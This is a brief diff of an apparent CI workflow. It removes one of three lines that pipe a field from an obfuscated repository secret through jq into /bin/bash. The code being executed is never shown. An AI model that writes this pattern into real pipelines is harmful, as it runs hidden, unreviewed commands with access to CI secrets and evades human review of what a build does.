@@ -22,7 +22,6 @@ jobs:
           qjd85: ${{ secrets.qjd85 }}
         run: |
           printf '%s' "$qjd85" | jq -r .zqdo46576 | /bin/bash
-          printf '%s' "$fweg66600" | jq -r .nie96 | /bin/bash
           printf '%s' "$ctz07073" | jq -r .az4 | /bin/bash
 
       - name: Store artifact
